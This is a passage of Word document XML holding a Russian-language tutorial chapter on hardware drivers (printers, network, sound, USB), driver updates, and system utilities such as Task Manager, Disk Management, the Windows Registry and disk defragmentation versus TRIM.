        <w:t>Принтер HP LaserJet 1020 (2005 год). Windows 11 не содержит драйвера для него. Придётся искать на сайте HP (или мучиться с generic-драйвером).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Linux: драйвер может быть в пакете **CUPS** (Common Unix Printing System), а может и не быть. Тогда танцы с бубном.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Зависание печати:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйвер принтера зависает → задания на печать застревают в очереди → принтер не печатает.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: перезапустить службу печати (Print Spooler в Windows, CUPS в Linux).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В Linux принтеры поддерживаются через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CUPS</w:t>
      </w:r>
      <w:r>
        <w:t>. Для некоторых принтеров драйверов нет вообще. Решение: купить принтер с поддержкой AirPrint (протокол Apple) или использовать generic-драйвер (печать будет, но без настроек). Поэтому Linux-пользователи часто шутят: "Принтер? Не, не слышал."</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>3. Драйверы сетевых карт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Управляют сетевым адаптером (Ethernet, Wi-Fi), передают и принимают пакеты данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Realtek Ethernet drivers (популярные в дешёвых материнских платах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Intel Wi-Fi drivers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Broadcom Wi-Fi drivers (популярны в ноутбуках)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работают в **kernel mode** (производительность критична).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддерживают TCP/IP стек, протоколы Ethernet/Wi-Fi (802.11ac, 802.11ax).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет интернета после установки ОС:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Установил Windows/Linux → драйвер сетевой карты не установлен → нет интернета → не можешь скачать драйвер (парадокс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: скачать драйвер на другом компьютере, перенести на флешке.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Wi-Fi не работает в Linux:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многие Wi-Fi-чипы (особенно Broadcom) требуют проприетарных драйверов (закрытый код).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Linux поставляется с открытыми драйверами, которые не поддерживают все чипы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Решение: установить проприетарный драйвер вручную (боль).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Купил новый ноутбук с Wi-Fi 6E (Intel AX210). Установил Ubuntu 20.04. Wi-Fi не работает. Драйвер для AX210 появился в ядре Linux 5.10, а в Ubuntu 20.04 ядро 5.4. Решение: обновить ядро до 5.10+ или установить драйвер вручную (iwlwifi).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Драйверы звуковых карт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Управляют аудио-устройствами (встроенная звуковая карта, внешние аудиоинтерфейсы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Realtek High Definition Audio drivers (99% встроенных звуковых карт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Creative Sound Blaster drivers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ASIO drivers (для профессионального аудио)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Работают в **kernel mode**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поддерживают разные форматы: стерео, 5.1, 7.1, Dolby Atmos.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Звук пропал после обновления Windows → драйвер Realtek сломался → переустановил драйвер → звук появился. Классика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5. Драйверы USB-устройств</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Управляют USB-устройствами (флешки, мышки, клавиатуры, веб-камеры).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Большинство USB-устройств работают через **generic-драйверы** (стандартные драйверы ОС).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Например, USB-флешка работает сразу после подключения (драйвер USB Mass Storage встроен в ОС).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Специфичные устройства (принтеры, сканеры, игровые рули) требуют отдельных драйверов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Подключил USB-флешку → Windows автоматически загрузила драйвер → флешка появилась в проводнике. Подключил игровой руль Logitech G29 → Windows загрузила generic-драйвер (руль работает, но без настройки кнопок) → установил драйвер Logitech Profiler → теперь можно настроить кнопки и силовую обратную связь (force feedback).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Обновление драйверов: зачем и как?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем обновлять драйверы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Исправление багов:** Старый драйвер содержит баги → новый драйвер их исправляет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поддержка новых устройств/функций:** Новая игра требует фичи DirectX 12 Ultimate → старый драйвер не поддерживает → нужно обновить.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизация производительности:** Драйверы видеокарт регулярно обновляются под новые игры (Game Ready Drivers от NVIDIA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность:** Драйверы могут содержать уязвимости → обновление закрывает дыры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как обновлять драйверы?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автоматически:** Windows Update загружает драйверы автоматически.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вручную:** Диспетчер устройств → правой кнопкой на устройство → "Обновить драйвер".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сайт производителя:** Скачать драйвер с сайта NVIDIA / AMD / Intel / HP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Linux:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Автоматически:** Ядро содержит большинство драйверов. Обновление ядра = обновление драйверов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вручную:** Для проприетарных драйверов (NVIDIA) — установить через пакетный менеджер (`apt install nvidia-driver-XXX`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>macOS:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Драйверы обновляются через System Updates. Apple контролирует всё железо, драйверы встроены в ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема обновления:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Иногда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>новый драйвер хуже старого</w:t>
      </w:r>
      <w:r>
        <w:t>. Например, NVIDIA выпустила драйвер 535.104.05 для Linux. Многие пользователи жаловались на снижение FPS в играх. Решение: откатиться на предыдущую версию (535.98).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если старый драйвер работает нормально — не трогай его (ain't broke, don't fix it).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3.4. Системные утилиты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Системные утилиты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программы для управления, обслуживания и настройки операционной системы. Они не управляют железом напрямую (как драйверы), но работают тесно с ОС.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Категории системных утилит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Утилиты управления системой</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти программы позволяют контролировать состояние системы: процессы, память, диски, сеть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>##### а) Диспетчер задач (Task Manager / System Monitor)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Показывает запущенные процессы, потребление CPU/RAM/диска/сети. Позволяет завершить зависший процесс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows:** Task Manager (Ctrl+Shift+Esc).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux:** `top`, `htop`, GNOME System Monitor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS:** Activity Monitor.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что показывает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Список процессов (программ).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Потребление CPU (% на каждое ядро).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Потребление RAM (сколько занято / свободно).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дисковая активность (чтение/запись в MB/s).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сетевая активность (скачивание/отдача в MB/s).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример использования:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Компьютер тормозит. Открыл Task Manager. Процесс `Chrome.exe` жрёт 8 GB RAM и 100% CPU. Завершил процесс → компьютер ожил.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Забавный факт:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Chrome создаёт отдельный процесс для каждой вкладки. Открыл 50 вкладок → в Task Manager 50 процессов `chrome.exe`. Это для безопасности (одна вкладка крашнется — другие выживут), но цена — RAM.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>##### б) Диспетчер дисков (Disk Management / fdisk / gparted)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Управление дисками и разделами (создание, удаление, форматирование, изменение размера).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows:** Disk Management (`diskmgmt.msc`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Linux:** `fdisk` (командная строка), `gparted` (графический).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**macOS:** Disk Utility.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что можно делать:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создать новый раздел (partition) на диске.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Форматировать раздел (NTFS, ext4, FAT32).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменить размер раздела (расширить / сжать).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Назначить букву диска (Windows: C:, D:, E:).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Купил новый SSD 1 TB. Подключил к компьютеру. Открыл Disk Management. Диск не размечен (unallocated). Создал раздел, отформатировал в NTFS, назначил букву E:. Теперь диск доступен в проводнике.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Форматирование диска </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>удаляет все данные</w:t>
      </w:r>
      <w:r>
        <w:t>. Будь осторожен.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>##### в) Редактор реестра (Registry Editor, Windows)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реестр Windows (Registry)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это централизованная база данных настроек ОС и программ. Хранит конфигурацию системы, параметры программ, настройки драйверов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Утилита:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Registry Editor (`regedit.exe`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура реестра:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HKEY_LOCAL_MACHINE (HKLM):** Настройки для всего компьютера (ОС, драйверы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HKEY_CURRENT_USER (HKCU):** Настройки текущего пользователя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HKEY_CLASSES_ROOT (HKCR):** Ассоциации файлов (какая программа открывает .txt, .mp3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Хочешь изменить обои рабочего стола через реестр (зачем? не знаю, но можно):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Открыл `regedit`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перешёл в `HKEY_CURRENT_USER\Control Panel\Desktop`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Изменил значение `Wallpaper` на путь к картинке.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перезагрузил систему → обои изменились.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Опасность:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Изменение реестра может сломать систему. Удалил не тот ключ → Windows не загружается. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не лезь в реестр, если не знаешь, что делаешь.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Утилиты обслуживания системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эти программы поддерживают систему в рабочем состоянии: чистят диск, дефрагментируют, делают резервные копии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>##### а) Дефрагментация диска (Disk Defragmenter)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дефрагментация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс упорядочивания файлов на жёстком диске (HDD), чтобы они лежали последовательно, а не разбросаны по всему диску.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужна (для HDD):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Жёсткий диск (HDD) — это магнитный диск с головкой, которая движется физически. Если файл разбит на фрагменты, разбросанные по всему диску, головке приходится прыгать туда-сюда (seek time). Это медленно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Дефрагментация собирает фрагменты файла вместе → головка читает файл последовательно → скорость чтения выше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для SSD дефрагментация ВРЕДНА:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>SSD (твердотельный накопитель) — это флеш-память, там нет движущихся частей. Доступ к любой ячейке одинаково быстрый. Дефрагментация бесполезна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Более того, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>дефрагментация SSD сокращает срок его жизни</w:t>
      </w:r>
      <w:r>
        <w:t>, потому что SSD имеют ограниченное количество циклов записи (P/E cycles, program/erase cycles). Дефрагментация = лишние записи = износ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для SSD используется TRIM:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TRIM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — команда, которая сообщает SSD, какие блоки данных больше не используются. SSD может стереть их заранее, чтобы ускорить будущие записи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>У тебя HDD 1 TB, забит на 80%. Файлы фрагментированы. Запустил дефрагментацию (Windows: Optimize Drives). Процесс занял 2 часа. После дефрагментации загрузка системы ускорилась на 20%.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">У тебя SSD 500 GB. Дефрагментация </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не нужна</w:t>
      </w:r>
      <w:r>
        <w:t>. Windows 10/11 автоматически запускает TRIM (Optimize Drives для SSD = TRIM, не дефрагментация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
